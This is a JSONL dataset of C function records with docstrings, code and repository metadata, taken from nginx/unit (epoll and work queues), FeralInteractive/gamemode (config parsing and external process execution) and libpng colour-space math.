{"docstring": "/*\n * NXT_EVENT_DISABLED state is used to track whether EPOLLONESHOT\n * event should be added or modified, epoll_ctl(2):\n *\n * EPOLLONESHOT (since Linux 2.6.2)\n *     Sets the one-shot behavior for the associated file descriptor.\n *     This means that after an event is pulled out with epoll_wait(2)\n *     the associated file descriptor is internally disabled and no\n *     other events will be reported by the epoll interface.  The user\n *     must call epoll_ctl() with EPOLL_CTL_MOD to rearm the file\n *     descriptor with a new event mask.\n */\n", "func_signal": "static void\nnxt_epoll_oneshot_read(nxt_event_engine_t *engine, nxt_fd_event_t *ev)", "code": "{\n    int  op;\n\n    op = (ev->read == NXT_EVENT_INACTIVE && ev->write == NXT_EVENT_INACTIVE) ?\n             EPOLL_CTL_ADD : EPOLL_CTL_MOD;\n\n    ev->read = NXT_EVENT_ONESHOT;\n    ev->write = NXT_EVENT_INACTIVE;\n\n    nxt_epoll_change(engine, ev, op, EPOLLIN | EPOLLONESHOT);\n}", "path": "unit/src/nxt_epoll_engine.c", "commit_date": "2020-04-15 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * Linux glibc 2.2 posix_spawn() is implemented via fork()/execve().\n * Linux glibc 2.4 posix_spawn() without file actions and spawn\n * attributes uses vfork()/execve().\n *\n * On FreeBSD 8.0 posix_spawn() is implemented via vfork()/execve().\n *\n * Solaris 10:\n *   In the Solaris 10 OS, posix_spawn() is currently implemented using\n *   private-to-libc vfork(), execve(), and exit() functions.  They are\n *   identical to regular vfork(), execve(), and exit() in functionality,\n *   but they are not exported from libc and therefore don't cause the\n *   deadlock-in-the-dynamic-linker problem that any multithreaded code\n *   outside of libc that calls vfork() can cause.\n *\n * On MacOSX 10.5 (Leoprad) and NetBSD 6.0 posix_spawn() is implemented\n * as syscall.\n */\n", "func_signal": "nxt_pid_t\nnxt_process_execute(nxt_task_t *task, char *name, char **argv, char **envp)", "code": "{\n    nxt_pid_t  pid;\n\n    nxt_debug(task, \"posix_spawn(\\\"%s\\\")\", name);\n\n    if (posix_spawn(&pid, name, NULL, NULL, argv, envp) != 0) {\n        nxt_alert(task, \"posix_spawn(\\\"%s\\\") failed %E\", name, nxt_errno);\n        return -1;\n    }\n\n    return pid;\n}", "path": "unit/src/nxt_process.c", "commit_date": "2020-10-27 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/* Move all works from a locked work queue to a usual work queue. */\n", "func_signal": "void\nnxt_locked_work_queue_move(nxt_thread_t *thr, nxt_locked_work_queue_t *lwq,\n    nxt_work_queue_t *wq)", "code": "{\n    nxt_work_t  *work;\n\n    nxt_thread_spin_lock(&lwq->lock);\n\n    work = lwq->head;\n\n    lwq->head = NULL;\n    lwq->tail = NULL;\n\n    nxt_thread_spin_unlock(&lwq->lock);\n\n    while (work != NULL) {\n        work->task->thread = thr;\n\n        nxt_work_queue_add(wq, work->handler, work->task,\n                           work->obj, work->data);\n\n        work = work->next;\n    }\n}", "path": "unit/src/nxt_work_queue.c", "commit_date": "2018-02-07 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * Although calling close() on a file descriptor will remove any epoll\n * events that reference the descriptor, in this case the close() acquires\n * the kernel global \"epmutex\" while epoll_ctl(EPOLL_CTL_DEL) does not\n * acquire the \"epmutex\" since Linux 3.13 if the file descriptor presents\n * only in one epoll set.  Thus removing events explicitly before closing\n * eliminates possible lock contention.\n */\n", "func_signal": "static nxt_bool_t\nnxt_epoll_close(nxt_event_engine_t *engine, nxt_fd_event_t *ev)", "code": "{\n    nxt_epoll_delete(engine, ev);\n\n    return ev->changing;\n}", "path": "unit/src/nxt_epoll_engine.c", "commit_date": "2020-04-15 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * nxt_size_t_parse() returns size_t value >= 0 on success,\n * -1 on failure, and -2 on overflow.\n */\n", "func_signal": "ssize_t\nnxt_size_t_parse(const u_char *p, size_t length)", "code": "{\n    u_char  c;\n    size_t  val;\n\n    static const size_t cutoff = NXT_SIZE_T_MAX / 10;\n    static const size_t cutlim = NXT_SIZE_T_MAX % 10;\n\n    if (nxt_fast_path(length != 0)) {\n\n        val = 0;\n\n        do {\n            c = *p++;\n\n            /* Values below '0' become >= 208. */\n            c = c - '0';\n\n            if (nxt_slow_path(c > 9)) {\n                return -1;\n            }\n\n            if (nxt_slow_path(val >= cutoff && (val > cutoff || c > cutlim))) {\n                /* An overflow. */\n                return -2;\n            }\n\n            val = val * 10 + c;\n\n            length--;\n\n        } while (length != 0);\n\n        return val;\n    }\n\n    return -1;\n}", "path": "unit/src/nxt_parse.c", "commit_date": "2017-04-10 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/* Add a work to a work queue tail. */\n", "func_signal": "void\nnxt_work_queue_add(nxt_work_queue_t *wq, nxt_work_handler_t handler,\n    nxt_task_t *task, void *obj, void *data)", "code": "{\n    nxt_work_t  *work;\n\n    nxt_work_queue_thread_assert(wq);\n\n    for ( ;; ) {\n        work = wq->cache->next;\n\n        if (nxt_fast_path(work != NULL)) {\n            wq->cache->next = work->next;\n            work->next = NULL;\n\n            work->handler = handler;\n            work->task = task;\n            work->obj = obj;\n            work->data = data;\n\n            if (wq->tail != NULL) {\n                wq->tail->next = work;\n\n            } else {\n                wq->head = work;\n            }\n\n            wq->tail = work;\n\n            return;\n        }\n\n        nxt_work_queue_allocate(wq->cache);\n    }\n}", "path": "unit/src/nxt_work_queue.c", "commit_date": "2018-02-07 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * Destroy internal parts of config\n */\n", "func_signal": "static void internal_destroy(GameModeConfig *self)", "code": "{\n\tpthread_rwlock_destroy(&self->rwlock);\n\n\tfor (unsigned int i = 0; i < CONFIG_NUM_LOCATIONS; i++) {\n\t\tif (self->inotwd[i] != -1) {\n\t\t\t/* TODO: Error handle */\n\t\t\tinotify_rm_watch(self->inotfd, self->inotwd[i]);\n\t\t}\n\t}\n\n\tif (self->inotfd != -1)\n\t\tclose(self->inotfd);\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Gets the screensaver inhibit setting\n */\n", "func_signal": "bool config_get_inhibit_screensaver(GameModeConfig *self)", "code": "{\n\tlong val;\n\tmemcpy_locked_config(self, &val, &self->values.inhibit_screensaver, sizeof(long));\n\treturn val == 1;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Check if the config needs to be reloaded\n */\n", "func_signal": "bool config_needs_reload(GameModeConfig *self)", "code": "{\n\tbool need = false;\n\n\t/* Take a read lock while we use the inotify fd */\n\tpthread_rwlock_rdlock(&self->rwlock);\n\n\tconst size_t buflen = sizeof(struct inotify_event) + NAME_MAX + 1;\n\tchar buffer[buflen] __attribute__((aligned(__alignof__(struct inotify_event))));\n\n\tssize_t len = read(self->inotfd, buffer, buflen);\n\tif (len == -1) {\n\t\t/* EAGAIN is returned when there's nothing to read on a non-blocking fd */\n\t\tif (errno != EAGAIN)\n\t\t\tLOG_ERROR(\"Could not read inotify fd: %s\\n\", strerror(errno));\n\t} else if (len > 0) {\n\t\t/* Iterate over each event we've been given */\n\t\tsize_t i = 0;\n\t\twhile (i < (size_t)len) {\n\t\t\tstruct inotify_event *event = (struct inotify_event *)&buffer[i];\n\t\t\t/* We have picked up an event and need to handle it */\n\t\t\tif (event->mask & IN_ISDIR) {\n\t\t\t\t/* If the event is a dir event we need to take a look */\n\t\t\t\tif (event->mask & IN_DELETE_SELF || event->mask & IN_MOVE_SELF) {\n\t\t\t\t\t/* The directory itself changed, trigger a reload */\n\t\t\t\t\tneed = true;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t} else {\n\t\t\t\t/* When the event has a filename (ie. is from a dir watch), check the name */\n\t\t\t\tif (event->len > 0) {\n\t\t\t\t\tif (strncmp(basename(event->name), CONFIG_NAME, strlen(CONFIG_NAME)) == 0) {\n\t\t\t\t\t\t/* This is a gamemode config file, trigger a reload */\n\t\t\t\t\t\tneed = true;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\t/* Otherwise this is for one of our watches on a specific config file, so\n\t\t\t\t\t * trigger the reload regardless */\n\t\t\t\t\tneed = true;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\ti += sizeof(struct inotify_event) + event->len;\n\t\t}\n\t}\n\n\t/* Return the read lock */\n\tpthread_rwlock_unlock(&self->rwlock);\n\n\treturn need;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Get a string value\n */\n", "func_signal": "static bool get_string_value(const char *value, char output[CONFIG_VALUE_MAX])", "code": "{\n\tstrncpy(output, value, CONFIG_VALUE_MAX - 1);\n\toutput[CONFIG_VALUE_MAX - 1] = '\\0';\n\treturn true;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Get the renice value\n */\n", "func_signal": "long config_get_renice_value(GameModeConfig *self)", "code": "{\n\tlong value = 0;\n\tmemcpy_locked_config(self, &value, &self->values.renice, sizeof(long));\n\t/* Validate the renice value */\n\tif ((value < 1 || value > 20) && value != 0) {\n\t\tLOG_ONCE(ERROR, \"Configured renice value '%ld' is invalid, will not renice.\\n\", value);\n\t\tvalue = 0;\n\t}\n\treturn value;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Get various config info for gpu optimisations\n */\n", "func_signal": "void config_get_apply_gpu_optimisations(GameModeConfig *self, char value[CONFIG_VALUE_MAX])", "code": "{\n\tmemcpy_locked_config(self,\n\t                     value,\n\t                     &self->values.apply_gpu_optimisations,\n\t                     sizeof(self->values.apply_gpu_optimisations));\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Get the chosen iGPU power threshold\n */\n", "func_signal": "float config_get_igpu_power_threshold(GameModeConfig *self)", "code": "{\n\tfloat value = 0;\n\tmemcpy_locked_config(self, &value, &self->values.igpu_power_threshold, sizeof(float));\n\t/* Validate the threshold value */\n\tif (isnan(value) || value < 0) {\n\t\tLOG_ONCE(ERROR,\n\t\t         \"Configured iGPU power threshold value '%f' is invalid, ignoring iGPU default \"\n\t\t         \"governor.\\n\",\n\t\t         value);\n\t\tvalue = FP_INFINITE;\n\t}\n\treturn value;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Add values to a char list\n */\n", "func_signal": "static bool append_value_to_list(const char *list_name, const char *value,\n                                 char list[CONFIG_LIST_MAX][CONFIG_VALUE_MAX])", "code": "{\n\tunsigned int i = 0;\n\twhile (*list[i] && ++i < CONFIG_LIST_MAX)\n\t\t;\n\n\tif (i < CONFIG_LIST_MAX) {\n\t\tstrncpy(list[i], value, CONFIG_VALUE_MAX);\n\n\t\tif (list[i][CONFIG_VALUE_MAX - 1] != '\\0') {\n\t\t\tLOG_ERROR(\"Config: Could not add [%s] to [%s], exceeds length limit of %d\\n\",\n\t\t\t          value,\n\t\t\t          list_name,\n\t\t\t          CONFIG_VALUE_MAX);\n\n\t\t\tmemset(list[i], 0, sizeof(list[i]));\n\t\t\treturn false;\n\t\t}\n\t} else {\n\t\tLOG_ERROR(\"Config: Could not add [%s] to [%s], exceeds number of %d\\n\",\n\t\t          value,\n\t\t          list_name,\n\t\t          CONFIG_LIST_MAX);\n\t\treturn false;\n\t}\n\n\treturn true;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Checks if the supervisor is blacklisted\n */\n", "func_signal": "bool config_get_supervisor_blacklisted(GameModeConfig *self, const char *supervisor)", "code": "{\n\t/* Take the read lock for the internal data */\n\tpthread_rwlock_rdlock(&self->rwlock);\n\n\t/*\n\t * Check if the value is found in our whitelist\n\t * Currently is a simple strstr check, but could be modified for wildcards etc.\n\t */\n\tbool found = config_string_list_contains(supervisor, self->values.supervisor_blacklist);\n\n\t/* release the lock */\n\tpthread_rwlock_unlock(&self->rwlock);\n\treturn found;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Get the chosen iGPU desired governor\n */\n", "func_signal": "void config_get_igpu_desired_governor(GameModeConfig *self, char governor[CONFIG_VALUE_MAX])", "code": "{\n\tmemcpy_locked_config(self,\n\t                     governor,\n\t                     self->values.igpu_desiredgov,\n\t                     sizeof(self->values.igpu_desiredgov));\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/* Define the getters for GPU values */\n", "func_signal": "DEFINE_CONFIG_GET(gpu_device)\nDEFINE_CONFIG_GET(nv_core_clock_mhz_offset)\nDEFINE_CONFIG_GET(nv_mem_clock_mhz_offset)\nDEFINE_CONFIG_GET(nv_powermizer_mode)\n\nvoid config_get_amd_performance_level(GameModeConfig *self, char value[CONFIG_VALUE_MAX])", "code": "{\n\tmemcpy_locked_config(self,\n\t                     value,\n\t                     &self->values.amd_performance_level,\n\t                     sizeof(self->values.amd_performance_level));\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/**\n * Call an external process\n */\n", "func_signal": "int run_external_process(const char *const *exec_args, char buffer[EXTERNAL_BUFFER_MAX], int tsec)", "code": "{\n\tpid_t p;\n\tint status = 0;\n\tint pipes[2];\n\tint ret = 0;\n\tchar internal[EXTERNAL_BUFFER_MAX] = { 0 };\n\n\tif (pipe(pipes) == -1) {\n\t\tLOG_ERROR(\"Could not create pipe: %s!\\n\", strerror(errno));\n\t\treturn -1;\n\t}\n\n\t/* Set the default timeout */\n\tif (tsec == -1) {\n\t\ttsec = DEFAULT_TIMEOUT;\n\t}\n\n\tif ((p = fork()) < 0) {\n\t\tclose(pipes[0]);\n\t\tclose(pipes[1]);\n\t\tLOG_ERROR(\"Failed to fork(): %s\\n\", strerror(errno));\n\t\treturn false;\n\t} else if (p == 0) {\n\t\t/* Send STDOUT to the pipe */\n\t\tdup2(pipes[1], STDOUT_FILENO);\n\t\tclose(pipes[0]);\n\t\tclose(pipes[1]);\n\t\t/* Execute the command */\n\t\t/* Note about cast:\n\t\t *   The statement about argv[] and envp[] being constants is\n\t\t *   included to make explicit to future writers of language\n\t\t *   bindings that these objects are completely constant.\n\t\t * http://pubs.opengroup.org/onlinepubs/9699919799/functions/exec.html\n\t\t */\n\t\tif (execv(exec_args[0], (char *const *)exec_args) != 0) {\n\t\t\tLOG_ERROR(\"Failed to execute external process: %s %s\\n\", exec_args[0], strerror(errno));\n\t\t\texit(EXIT_FAILURE);\n\t\t}\n\t\t// should never be reached\n\t\tabort();\n\t}\n\n\t// close the write end of the pipe so we get signaled EOF once the\n\t// child exits\n\tclose(pipes[1]);\n\tret = read_child_stdout(pipes[0], internal, tsec);\n\tclose(pipes[0]);\n\n\tif (ret != 0) {\n\t\tif (ret == -2) {\n\t\t\tLOG_ERROR(\"Child process timed out for %s, killing and returning\\n\", exec_args[0]);\n\t\t\tkill(p, SIGKILL);\n\t\t} else {\n\t\t\tLOG_ERROR(\"Failed to read from process %s: %s\\n\", exec_args[0], strerror(errno));\n\t\t}\n\t\tif (buffer) {\n\t\t\t// make sure the buffer is a terminated empty string on error\n\t\t\tbuffer[0] = 0;\n\t\t}\n\t} else if (buffer) {\n\t\tmemcpy(buffer, internal, EXTERNAL_BUFFER_MAX);\n\t}\n\n\tif (waitpid(p, &status, 0) < 0) {\n\t\tLOG_ERROR(\"Failed to waitpid(%d): %s\\n\", (int)p, strerror(errno));\n\t\treturn -1;\n\t}\n\n\t/* i.e. sigsev */\n\tif (!WIFEXITED(status)) {\n\t\tLOG_ERROR(\"Child process '%s' exited abnormally\\n\", exec_args[0]);\n\t} else if (WEXITSTATUS(status) != 0) {\n\t\tLOG_ERROR(\"External process failed with exit code %d\\n\", WEXITSTATUS(status));\n\t\tLOG_ERROR(\"Output was: %s\\n\", internal);\n\t\treturn -1;\n\t}\n\n\treturn 0;\n}", "path": "gamemode/common/common-external.c", "commit_date": "2019-06-01 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Handler for the inih callback\n */\n", "func_signal": "static int inih_handler(void *user, const char *section, const char *name, const char *value)", "code": "{\n\tGameModeConfig *self = (GameModeConfig *)user;\n\tbool valid = false;\n\n\tif (strcmp(section, \"filter\") == 0) {\n\t\t/* Filter subsection */\n\t\tif (strcmp(name, \"whitelist\") == 0) {\n\t\t\tvalid = append_value_to_list(name, value, self->values.whitelist);\n\t\t} else if (strcmp(name, \"blacklist\") == 0) {\n\t\t\tvalid = append_value_to_list(name, value, self->values.blacklist);\n\t\t}\n\t} else if (strcmp(section, \"general\") == 0) {\n\t\t/* General subsection */\n\t\tif (strcmp(name, \"reaper_freq\") == 0) {\n\t\t\tvalid = get_long_value(name, value, &self->values.reaper_frequency);\n\t\t} else if (strcmp(name, \"defaultgov\") == 0) {\n\t\t\tvalid = get_string_value(value, self->values.defaultgov);\n\t\t} else if (strcmp(name, \"desiredgov\") == 0) {\n\t\t\tvalid = get_string_value(value, self->values.desiredgov);\n\t\t} else if (strcmp(name, \"igpu_desiredgov\") == 0) {\n\t\t\tvalid = get_string_value(value, self->values.igpu_desiredgov);\n\t\t} else if (strcmp(name, \"igpu_power_threshold\") == 0) {\n\t\t\tvalid = get_float_value(name, value, &self->values.igpu_power_threshold);\n\t\t} else if (strcmp(name, \"softrealtime\") == 0) {\n\t\t\tvalid = get_string_value(value, self->values.softrealtime);\n\t\t} else if (strcmp(name, \"renice\") == 0) {\n\t\t\tvalid = get_long_value(name, value, &self->values.renice);\n\t\t} else if (strcmp(name, \"ioprio\") == 0) {\n\t\t\tvalid = get_string_value(value, self->values.ioprio);\n\t\t} else if (strcmp(name, \"inhibit_screensaver\") == 0) {\n\t\t\tvalid = get_long_value(name, value, &self->values.inhibit_screensaver);\n\t\t}\n\t} else if (strcmp(section, \"gpu\") == 0) {\n\t\t/* Protect the user - don't allow these config options from unsafe config locations */\n\t\tif (!load_protected) {\n\t\t\tLOG_ERROR(\n\t\t\t    \"The [gpu] config section is not configurable from unsafe config files! Option %s \"\n\t\t\t    \"will be ignored!\\n\",\n\t\t\t    name);\n\t\t\tLOG_ERROR(\n\t\t\t    \"Consider moving this option to /etc/gamemode.ini or \"\n\t\t\t    \"/usr/share/gamemode/gamemode.ini\\n\");\n\t\t}\n\n\t\t/* GPU subsection */\n\t\tif (strcmp(name, \"apply_gpu_optimisations\") == 0) {\n\t\t\tvalid = get_string_value(value, self->values.apply_gpu_optimisations);\n\t\t} else if (strcmp(name, \"gpu_device\") == 0) {\n\t\t\tvalid = get_long_value(name, value, &self->values.gpu_device);\n\t\t} else if (strcmp(name, \"nv_core_clock_mhz_offset\") == 0) {\n\t\t\tvalid = get_long_value(name, value, &self->values.nv_core_clock_mhz_offset);\n\t\t} else if (strcmp(name, \"nv_mem_clock_mhz_offset\") == 0) {\n\t\t\tvalid = get_long_value(name, value, &self->values.nv_mem_clock_mhz_offset);\n\t\t} else if (strcmp(name, \"nv_powermizer_mode\") == 0) {\n\t\t\tvalid = get_long_value(name, value, &self->values.nv_powermizer_mode);\n\t\t} else if (strcmp(name, \"amd_performance_level\") == 0) {\n\t\t\tvalid = get_string_value(value, self->values.amd_performance_level);\n\t\t}\n\t} else if (strcmp(section, \"supervisor\") == 0) {\n\t\t/* Supervisor subsection */\n\t\tif (strcmp(name, \"supervisor_whitelist\") == 0) {\n\t\t\tvalid = append_value_to_list(name, value, self->values.supervisor_whitelist);\n\t\t} else if (strcmp(name, \"supervisor_blacklist\") == 0) {\n\t\t\tvalid = append_value_to_list(name, value, self->values.supervisor_blacklist);\n\t\t} else if (strcmp(name, \"require_supervisor\") == 0) {\n\t\t\tvalid = get_long_value(name, value, &self->values.require_supervisor);\n\t\t}\n\t} else if (strcmp(section, \"custom\") == 0) {\n\t\t/* Custom subsection */\n\t\tif (strcmp(name, \"start\") == 0) {\n\t\t\tvalid = append_value_to_list(name, value, self->values.startscripts);\n\t\t} else if (strcmp(name, \"end\") == 0) {\n\t\t\tvalid = append_value_to_list(name, value, self->values.endscripts);\n\t\t} else if (strcmp(name, \"script_timeout\") == 0) {\n\t\t\tvalid = get_long_value(name, value, &self->values.script_timeout);\n\t\t}\n\t}\n\n\tif (!valid) {\n\t\t/* Simply ignore the value, but with a log */\n\t\tLOG_MSG(\"Config: Value ignored [%s] %s=%s\\n\", section, name, value);\n\t}\n\n\treturn 1;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Get the chosen soft realtime behavior\n */\n", "func_signal": "void config_get_soft_realtime(GameModeConfig *self, char softrealtime[CONFIG_VALUE_MAX])", "code": "{\n\tmemcpy_locked_config(self,\n\t                     softrealtime,\n\t                     self->values.softrealtime,\n\t                     sizeof(self->values.softrealtime));\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Get the ioprio value\n */\n", "func_signal": "long config_get_ioprio_value(GameModeConfig *self)", "code": "{\n\tlong value = 0;\n\tchar ioprio_value[CONFIG_VALUE_MAX] = { 0 };\n\tmemcpy_locked_config(self, ioprio_value, &self->values.ioprio, sizeof(self->values.ioprio));\n\n\t/* account for special string values */\n\tif (0 == strncmp(ioprio_value, \"off\", sizeof(self->values.ioprio)))\n\t\tvalue = IOPRIO_DONT_SET;\n\telse if (0 == strncmp(ioprio_value, \"default\", sizeof(self->values.ioprio)))\n\t\tvalue = IOPRIO_RESET_DEFAULT;\n\telse\n\t\tvalue = atoi(ioprio_value);\n\n\t/* Validate values */\n\tif (IOPRIO_RESET_DEFAULT == value) {\n\t\tLOG_ONCE(MSG, \"IO priority will be reset to default behavior (based on CPU priority).\\n\");\n\t\tvalue = 0;\n\t} else {\n\t\t/* maybe clamp the value */\n\t\tlong invalid_ioprio = value;\n\t\tvalue = CLAMP(0, 7, value);\n\t\tif (value != invalid_ioprio)\n\t\t\tLOG_ONCE(ERROR,\n\t\t\t         \"IO priority value %ld invalid, clamping to %ld\\n\",\n\t\t\t         invalid_ioprio,\n\t\t\t         value);\n\t}\n\n\treturn value;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Copy a config parameter with a lock\n */\n", "func_signal": "static void memcpy_locked_config(GameModeConfig *self, void *dst, void *src, size_t n)", "code": "{\n\t/* Take the read lock */\n\tpthread_rwlock_rdlock(&self->rwlock);\n\n\t/* copy the data */\n\tmemcpy(dst, src, n);\n\n\t/* release the lock */\n\tpthread_rwlock_unlock(&self->rwlock);\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Get a set of scripts to call when gamemode starts\n */\n", "func_signal": "void config_get_gamemode_start_scripts(GameModeConfig *self,\n                                       char scripts[CONFIG_LIST_MAX][CONFIG_VALUE_MAX])", "code": "{\n\tmemcpy_locked_config(self,\n\t                     scripts,\n\t                     self->values.startscripts,\n\t                     sizeof(self->values.startscripts));\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Create a context object\n */\n", "func_signal": "GameModeConfig *config_create(void)", "code": "{\n\tGameModeConfig *newconfig = (GameModeConfig *)malloc(sizeof(GameModeConfig));\n\n\treturn newconfig;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Get a long value from a string\n */\n", "func_signal": "static bool get_float_value(const char *value_name, const char *value, float *output)", "code": "{\n\tchar *end = NULL;\n\tfloat config_value = strtof(value, &end);\n\n\tif (errno == ERANGE) {\n\t\tLOG_ERROR(\"Config: %s overflowed, given [%s]\\n\", value_name, value);\n\t\treturn false;\n\t} else if (!(*value != '\\0' && end && *end == '\\0')) {\n\t\tLOG_ERROR(\"Config: %s was invalid, given [%s]\\n\", value_name, value);\n\t\treturn false;\n\t} else {\n\t\t*output = config_value;\n\t}\n\n\treturn true;\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/*\n * Initialise the config\n */\n", "func_signal": "void config_init(GameModeConfig *self)", "code": "{\n\tpthread_rwlock_init(&self->rwlock, NULL);\n\n\tself->inotfd = inotify_init1(IN_NONBLOCK);\n\tif (self->inotfd == -1)\n\t\tLOG_ERROR(\n\t\t    \"inotify_init failed: %s, gamemode will not be able to watch config files for edits!\\n\",\n\t\t    strerror(errno));\n\n\tfor (unsigned int i = 0; i < CONFIG_NUM_LOCATIONS; i++) {\n\t\tself->inotwd[i] = -1;\n\t}\n\n\t/* load the initial config */\n\tload_config_files(self);\n}", "path": "gamemode/daemon/gamemode-config.c", "commit_date": "2020-02-26 00:00:00", "repo_name": "FeralInteractive/gamemode", "stars": 4284, "license": "bsd-3-clause", "language": "c", "size": 734}
{"docstring": "/* The inverse of the above. */\n", "func_signal": "png_fixed_point\npng_reciprocal2(png_fixed_point a, png_fixed_point b)", "code": "{\n   /* The required result is 1/a * 1/b; the following preserves accuracy. */\n#ifdef PNG_FLOATING_ARITHMETIC_SUPPORTED\n   if (a != 0 && b != 0)\n   {\n      double r = 1E15/a;\n      r /= b;\n      r = floor(r+.5);\n\n      if (r <= 2147483647. && r >= -2147483648.)\n         return (png_fixed_point)r;\n   }\n#else\n   /* This may overflow because the range of png_fixed_point isn't symmetric,\n    * but this API is only used for the product of file and screen gamma so it\n    * doesn't matter that the smallest number it can produce is 1/21474, not\n    * 1/100000\n    */\n   png_fixed_point res = png_product2(a, b);\n\n   if (res != 0)\n      return png_reciprocal(res);\n#endif\n\n   return 0; /* overflow */\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* Added in libpng-1.6.0, a different check for the validity of a set of cHRM\n * chunk chromaticities.  Earlier checks used to simply look for the overflow\n * condition (where the determinant of the matrix to solve for XYZ ends up zero\n * because the chromaticity values are not all distinct.)  Despite this it is\n * theoretically possible to produce chromaticities that are apparently valid\n * but that rapidly degrade to invalid, potentially crashing, sets because of\n * arithmetic inaccuracies when calculations are performed on them.  The new\n * check is to round-trip xy -> XYZ -> xy and then check that the result is\n * within a small percentage of the original.\n */\n", "func_signal": "static int\npng_colorspace_check_xy(png_XYZ *XYZ, const png_xy *xy)", "code": "{\n   int result;\n   png_xy xy_test;\n\n   /* As a side-effect this routine also returns the XYZ endpoints. */\n   result = png_XYZ_from_xy(XYZ, xy);\n   if (result != 0)\n      return result;\n\n   result = png_xy_from_XYZ(&xy_test, XYZ);\n   if (result != 0)\n      return result;\n\n   if (png_colorspace_endpoints_match(xy, &xy_test,\n       5/*actually, the math is pretty accurate*/) != 0)\n      return 0;\n\n   /* Too much slip */\n   return 1;\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
